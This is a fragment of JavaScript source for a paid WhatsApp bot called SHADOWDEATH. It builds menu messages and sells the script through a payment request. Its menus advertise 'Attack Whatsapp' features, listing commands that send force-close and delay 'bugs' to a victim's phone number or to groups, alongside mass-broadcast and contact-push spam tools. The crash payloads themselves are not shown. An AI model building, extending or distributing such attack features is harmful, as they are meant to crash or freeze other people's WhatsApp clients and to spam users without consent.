𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip
𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! 
𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial

\`[ 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 ]\`
◇ .ai
◇ .gpt
◇ .tourl
◇ .tourl2
◇ .ssweb
◇ .translate
◇ .tohd
◇ .shortlink
◇ .shortlink2

`
    let buttons = [
        { buttonId: ".ðwñêr", buttonText: { displayText: "▢ Ðêvêlðþêr ßð†" } },
        { buttonId: ".†q†ð", buttonText: { displayText: "▢ †q†ð" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },        
        caption: monyet,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
                body: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
                thumbnailUrl: `https://img1.pixhost.to/images/6076/604846668_vynx.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "List Menu",
                sections: [
                    {
                        title: "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                        highlight_label: "Attack Whatsapp 🕊",
                        rows: [
                            { title: "BugMenu", description: "Shadow Attack Whatsapp🕊", id: `.bugmenu` },
                            { title: "MainMenu", description: "List FunMenu🛠", id: `.funmenu` },
                            { title: "Searchmenu", description: "List Search Menu 🔍", id: `.smenu` },
                            { title: "Toolsmenu", description: "List Toolsmenu👾", id: `.toolsmenu` },
                            { title: "Buy Script", description: "Buy Scrpit. Shadow🛍️", id: `.sc` },
                            { title: "Downloadmenu", description: "List Downloadmenu📥", id: `.downloadmenu` },
                            { title: "Storemenu", description: "List Storemenu🛒", id: `.storemenu` },         
                            { title: "Groupmenu", description: "List Groupmenu🏘", id: `.grupmenu` },
                            { title: "Ownermenu", description: "Ownermenu👤", id: `.ownermenu` }, 
                           
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });     
}
break;

case "downloadmenu": {
let pepek = `Whatshapp Broo👋 ${getGreeting()}, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝗩𝘆𝗻𝘅𝘅 
\`[ 𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 𝗜𝗻𝗳𝗼 ]\`
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊
𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip
𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! 
𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial

\`[ 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗠𝗲𝗻𝘂 ]\`
◇ .tiktok 
◇ .tiktokmp3
◇ .facebook
◇ .capcut
◇ .instagram
◇ .ytmp3
◇ .ytmp4
◇ .play
◇ .playvid
◇ .gitclone
◇ .mediafire
`
    let buttons = [
        { buttonId: ".ðwñêr", buttonText: { displayText: "▢ Ðêvêlðþêr ßð†" } },
        { buttonId: ".†q†ð", buttonText: { displayText: "▢ †q†ð" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },        
        caption: pepek,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
                body: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
                thumbnailUrl: `https://img1.pixhost.to/images/6076/604847056_vynx.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "List Menu",
                sections: [
                    {
                        title: "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                        highlight_label: "Attack Whatsapp 🕊",
                        rows: [
                            { title: "BugMenu", description: "Shadow Attack Whatsapp🕊", id: `.bugmenu` },
                            { title: "MainMenu", description: "List FunMenu🛠", id: `.funmenu` },
                            { title: "Searchmenu", description: "List Search Menu 🔍", id: `.smenu` },
                            { title: "Toolsmenu", description: "List Toolsmenu👾", id: `.toolsmenu` },
                            { title: "Buy Script", description: "Buy Scrpit. Shadow🛍️", id: `.sc` },
                            { title: "Downloadmenu", description: "List Downloadmenu📥", id: `.downloadmenu` },
                            { title: "Storemenu", description: "List Storemenu🛒", id: `.storemenu` },         
                            { title: "Groupmenu", description: "List Groupmenu🏘", id: `.grupmenu` },
                            { title: "Ownermenu", description: "Ownermenu👤", id: `.ownermenu` },
                           
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });     
}
break;

case "storemenu": {
let ppk = `Haii kak👋 ${getGreeting()}, I'm 𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 
\`[ 𝗦𝘂𝗻𝗚𝗼𝗱𝗡𝗶𝗸𝗮 𝗜𝗻𝗳𝗼 ]\`
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊
𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip
𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! 
𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial

\`[ 𝗦𝘁𝗼𝗿𝗲 𝗠𝗲𝗻𝘂 ]\`
◇ .addrespon
◇ .delrespon
◇ .listrespon
◇ .done
◇ .proses
◇ .jpm
◇ .jpm2
◇ .jpmtesti
◇ .jpmslide
◇ .jpmslideht
◇ .sendtesti
◇ .pushkontak
◇ .pushkontak2
◇ .payment
◇ .produk
`
    let buttons = [
        { buttonId: ".ðwñêr", buttonText: { displayText: "▢ Ðêvêlðþêr ßð†" } },
        { buttonId: ".†q†ð", buttonText: { displayText: "▢ †q†ð" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },        
        caption: ppk,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
                body: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
                thumbnailUrl: `https://img1.pixhost.to/images/6076/604847453_vynx.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "List Menu",
                sections: [
                    {
                        title: "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                        highlight_label: "Attack Whatsapp 🕊",
                        rows: [
                            { title: "BugMenu", description: "Shadow Attack Whatsapp🕊", id: `.bugmenu` },
                            { title: "MainMenu", description: "List FunMenu🛠", id: `.funmenu` },
                            { title: "Searchmenu", description: "List Search Menu 🔍", id: `.smenu` },
                            { title: "Toolsmenu", description: "List Toolsmenu👾", id: `.toolsmenu` },
                            { title: "Buy Script", description: "Buy Scrpit. Shadow🛍️", id: `.sc` },
                            { title: "Downloadmenu", description: "List Downloadmenu📥", id: `.downloadmenu` },
                            { title: "Storemenu", description: "List Storemenu🛒", id: `.storemenu` },         
                            { title: "Groupmenu", description: "List Groupmenu🏘", id: `.grupmenu` },
                            { title: "Ownermenu", description: "Ownermenu👤", id: `.ownermenu` }, 
                           
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });     
}
break;

case "grupmenu": {
let aish = `Haii kak👋 ${getGreeting()}, I'm 𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 
\`[ 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 𝗜𝗻𝗳𝗼 ]\`
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊
𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip
𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! 
𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial

\`[ 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂 ]\` 
◇ .antilink
◇ .antilink2
◇ .blacklistjpm
◇ .welcome
◇ .add
◇ .kick
◇ .close
◇ .open
◇ .hidetag
◇ .kudetagc
◇ .leave
◇ .tagall
◇ .promote
◇ .demote
◇ .resetlinkgc
◇ .linkgc
`
    let buttons = [
        { buttonId: ".ðwñêr", buttonText: { displayText: "▢ Ðêvêlðþêr ßð†" } },
        { buttonId: ".†q†ð", buttonText: { displayText: "▢ †q†ð" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },        
        caption: aish,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
                body: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
                thumbnailUrl: `https://img1.pixhost.to/images/6076/604848057_vynx.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "List Menu",
                sections: [
                    {
                        title: "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                        highlight_label: "Attack Whatsapp 🕊",
                        rows: [
                            { title: "BugMenu", description: "Shadow Attack Whatsapp🕊", id: `.bugmenu` },
                            { title: "MainMenu", description: "List FunMenu🛠", id: `.funmenu` },
                            { title: "Searchmenu", description: "List Search Menu 🔍", id: `.smenu` },
                            { title: "Toolsmenu", description: "List Toolsmenu👾", id: `.toolsmenu` },
                            { title: "Buy Script", description: "Buy Scrpit. Shadow🛍️", id: `.sc` },
                            { title: "Downloadmenu", description: "List Downloadmenu📥", id: `.downloadmenu` },
                            { title: "Storemenu", description: "List Storemenu🛒", id: `.storemenu` },         
                            { title: "Groupmenu", description: "List Groupmenu🏘", id: `.grupmenu` },
                            { title: "Ownermenu", description: "Ownermenu👤", id: `.ownermenu` },  
                           
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });     
}
break;

case "ownermenu": {
let devdepay = `Haii kak👋 ${getGreeting()}, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 
\`[ 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 𝗜𝗻𝗳𝗼 ]\`
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊
𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip
𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! 
𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial

\`[ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 ]\`
◇ .autoread
◇ .autopromosi
◇ .autoreadsw
◇ .autotyping
◇ .addowner
◇ .listowner
◇ .delowner
◇ .public
◇ .self
◇ .subdomain
◇ .setimgmenu
◇ .setimgfake
◇ .setppbot
◇ .clearsession
◇ .clearchat
◇ .resetdb
◇ .restartbot
◇ .getsc
◇ .getcase
◇ .listgc
◇ .joingc
◇ .joinch
◇ .upchannel
◇ .upchannel2
◇ .ambilq
`
    let buttons = [
        { buttonId: ".ðwñêr", buttonText: { displayText: "▢ Ðêvêlðþêr ßð†" } },
        { buttonId: ".†q†ð", buttonText: { displayText: "▢ †q†ð" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },        
        caption: devdepay,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
                body: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
                thumbnailUrl: `https://img1.pixhost.to/images/6076/604845970_vynx.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "List Menu",
                sections: [
                    {
                        title: "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                        highlight_label: "Attack Whatsapp 🕊",
                        rows: [
                            { title: "BugMenu", description: "Shadow Attack Whatsapp🕊", id: `.bugmenu` },
                            { title: "MainMenu", description: "List FunMenu🛠", id: `.funmenu` },
                            { title: "Searchmenu", description: "List Search Menu 🔍", id: `.smenu` },
                            { title: "Toolsmenu", description: "List Toolsmenu👾", id: `.toolsmenu` },
                            { title: "Buy Script", description: "Buy Scrpit. Shadow🛍️", id: `.sc` },
                            { title: "Downloadmenu", description: "List Downloadmenu📥", id: `.downloadmenu` },
                            { title: "Storemenu", description: "List Storemenu🛒", id: `.storemenu` },         
                            { title: "Groupmenu", description: "List Groupmenu🏘", id: `.grupmenu` },
                            { title: "Ownermenu", description: "Ownermenu👤", id: `.ownermenu` }, 
                           
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });     
}
break;

case 'allfitur': {	
let menu = `Whatshapp Broo👋 ${getGreeting()}, ingin melihat semua menu script 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 ya? ketik *.allmenu*
`
let buttons = [
     { buttonId: ".allmenu", buttonText: { displayText: "𝗔͢𝗹͠𝗹𝗠͢𝗲͠𝗻͠𝘂" } }
];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },
	    gifPlayback: true,
	    caption: menu,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
             title: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
              body: `© 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
             thumbnailUrl: `https://img1.pixhost.to/images/6076/604849078_vynx.jpg`,
            sourceUrl: ``,
           mediaType: 1,
          renderLargerThumbnail: false, 
         }
        },
        footer: "© 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: m });            
                }
break

case "allmenu": {
await vynx.sendMessage(m.chat, { react: { text: "🪐",key: m.key,}}); 
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let depky = `Whatshapp Broo👋 ${getGreeting()}, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 
\`[ 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊𝗰 𝗜𝗻𝗳𝗼 ]\`
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊
𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip
𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! 
𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial

\`[ 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗕𝘂𝗴 ]\`
◇ .shadow 628xxx [ Button Bug ]
◇ .xvshadow 628xxx [ Forclose Bug ]
◇ .shadow-force 628xxx [ Forclose Hard ]
◇ .invis-vx 628xxx [ Delay Invis ]
◇ .invis-shadow 628xxx [ Delay Hard ]

\`[ 𝗕𝘂𝗴 𝗚𝗿𝗼𝘂𝗽 ]\`
◇ .force-group [ Link Group ]
◇ .shadow-group [ Link Group ]
◇ .death-group [ In Place ]

\`[ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 ]\`
◇ .autoread
◇ .autopromosi
◇ .autoreadsw
◇ .autotyping
◇ .addowner
◇ .listowner
◇ .delowner
◇ .public
◇ .self
◇ .subdomain
◇ .setimgmenu
◇ .setimgfake
◇ .setppbot
◇ .clearsession
◇ .clearchat
◇ .resetdb
◇ .restartbot
◇ .getsc
◇ .getcase
◇ .listgc
◇ .joingc
◇ .joinch
◇ .upchannel
◇ .upchannel2
◇ .ambilq

\`[ 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂 ]\` 
◇ .antilink
◇ .antilink2
◇ .blacklistjpm
◇ .welcome
◇ .add
◇ .kick
◇ .close
◇ .open
◇ .hidetag
◇ .kudetagc
◇ .leave
◇ .tagall
◇ .promote
◇ .demote
◇ .resetlinkgc
◇ .linkgc

\`[ 𝗦𝘁𝗼𝗿𝗲 𝗠𝗲𝗻𝘂 ]\`
◇ .addrespon
◇ .delrespon
◇ .listrespon
◇ .done
◇ .proses
◇ .jpm
◇ .jpm2
◇ .jpmtesti
◇ .jpmslide
◇ .jpmslideht
◇ .sendtesti
◇ .pushkontak
◇ .pushkontak2
◇ .payment
◇ .produk

\`[ 𝗦𝗲𝗮𝗿𝗰𝗵𝗺𝗲𝗻𝘂 ]\`
◇ .yts
◇ .apkmod
◇ .pinterest
◇ .gimage  
◇ .sfile

\`[ 𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂 ]\`
◇ .cekidch
◇ .cekidgc
◇ .qc
◇ .brat
◇ .bratvid
◇ .readviewonce
◇ .stickerwm
◇ .sticker

\`[ 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 ]\`
◇ .ai
◇ .gpt
◇ .tourl
◇ .tourl2
◇ .ssweb
◇ .translate
◇ .tohd
◇ .shortlink
◇ .shortlink2

\`[ 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗠𝗲𝗻𝘂 ]\`
◇ .tiktok 
◇ .tiktokmp3
◇ .facebook
◇ .capcut
◇ .instagram
◇ .ytmp3
◇ .ytmp4
◇ .play
◇ .playvid
◇ .gitclone
◇ .mediafire
`
    let buttons = [
        { buttonId: ".ðwñêr", buttonText: { displayText: "▢ Ðêvêlðþêr ßð†" } },
        { buttonId: ".†q†ð", buttonText: { displayText: "▢ †q†ð" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/6076/604844805_vynx.jpg` },        
        caption: depky,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊`,
                body: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
                thumbnailUrl: `https://img1.pixhost.to/images/6076/604849511_vynx.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: true, 
            }
        },
        footer: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "List Menu",
                sections: [
                    {
                        title: "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                        highlight_label: "Attack Whatsapp 🕊",
                        rows: [
                            { title: "BugMenu", description: "Shadow Attack Whatsapp🕊", id: `.bugmenu` },
                            { title: "MainMenu", description: "List FunMenu🛠", id: `.funmenu` },
                            { title: "Searchmenu", description: "List Search Menu 🔍", id: `.smenu` },
                            { title: "Toolsmenu", description: "List Toolsmenu👾", id: `.toolsmenu` },
                            { title: "Buy Script", description: "Buy Scrpit. Shadow🛍️", id: `.sc` },
                            { title: "Downloadmenu", description: "List Downloadmenu📥", id: `.downloadmenu` },
                            { title: "Storemenu", description: "List Storemenu🛒", id: `.storemenu` },         
                            { title: "Groupmenu", description: "List Groupmenu🏘", id: `.grupmenu` },
                            { title: "Ownermenu", description: "Ownermenu👤", id: `.ownermenu` }, 
                           
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await vynx.sendMessage(m.chat, buttonMessage, { quoted: lol });  
    await vynx.sendMessage(m.chat, {audio: fs.readFileSync('./image/musik1.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})     
}
break;

case 'owner': case "depay": {
await vynx.sendMessage(m.chat, { react: { text: "🕊",key: m.key,}}); 
let menu = `
*\`𝗖𝗿𝗲𝗮𝘁𝗼𝗿 𝗦𝗰𝗿𝗶𝗽𝘁\`*`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: `𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊`,
 newsletterJid: "120363409362506610@newsletter",
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: vynx.decodeJid(vynx.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 𝗦𝗰𝗿𝗶𝗽𝘁 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: yuda }, { upload: vynx.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝗖𝗿𝗲𝗮𝘁𝗼𝗿\",\"url\":\"https://wa.me/62895320985817\",\"merchant_url\":\"https://wa.me/62895320985817\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝗦𝗮𝗹𝘂𝗿𝗮𝗻𝗗𝗲𝘃\",\"url\":\"https://whatsapp.com/channel/0029Vb9ghly6GcGM2ngCEk00\",\"merchant_url\":\"https://wa.me/62895320985817\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝗠𝗮𝗿𝗸𝗲𝘁𝗣𝗹𝗮𝗰𝗲\",\"url\":\"https://whatsapp.com/channel/0029Vb9ghly6GcGM2ngCEk00\",\"merchant_url\":\"https://wa.me/62895320985817\"}`
}],
 })
 })
 }
 }
}, {})

await vynx.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

case 'script': case "sc": {
let buy = `*▧ 「 sᴄʀɪᴘᴛ - 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛 4 ᴠɪᴘ  」*
- sᴄʀɪᴘᴛ 𝟸𝟻𝙺 - 𝙵𝚁𝙴𝙴 𝚄𝙿
- ʀᴇssᴇʟʟᴇʀ 𝟻𝟶𝙺 - 𝙵𝚁𝙴𝙴 𝚄𝙿

𝚂𝙴𝙲𝚄𝚁𝙸𝚃𝚈 𝚂𝙲
- 𝙺𝙴𝚈 
- 𝙰𝙽𝚃𝙸 𝙲𝚁𝙰𝙲𝙺

𝚂𝙲𝚁𝙸𝙿𝚃 𝙱𝚄𝙶 ɢᴀᴄᴏʀ
𝙼𝙸𝙽𝙰𝚃 𝙲𝙷𝙰𝚃 𝙾𝚆𝙽𝙴𝚁
wa.me/62895320985817
`
vynx.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 80000000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
await sleep(2500)
}
break

case "tqto": case "credit": {
let menu = `\`[ 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 ]\`
Vynx *𝐂𝐫𝐞𝐚𝐭𝐨𝐫*
Reva *𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐒𝐲𝐬𝐭𝐞𝐦💗*
Cioo *𝐌𝐲𝐁𝐫𝐨*
Januu *𝐏𝐚𝐫𝐭𝐧𝐞𝐫*
Mr.KomodoxPloit *𝐏𝐚𝐫𝐭𝐧𝐞𝐫*
Tio.official *𝐌𝐲𝐏𝐚𝐫𝐭𝐧𝐞𝐫*
Zoro.official *𝐁𝐞𝐬𝐭𝐅𝐫𝐢𝐞𝐧𝐝*
Dewa Marz *𝐁𝐞𝐬𝐭𝐅𝐫𝐢𝐞𝐧𝐝*
`
let buttons = [
        { buttonId: ".owner", buttonText: { displayText: "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁" } },  
        { buttonId: ".sc", buttonText: { displayText: "▢ Buy Script" } }
    ];

let buttonMessage = {
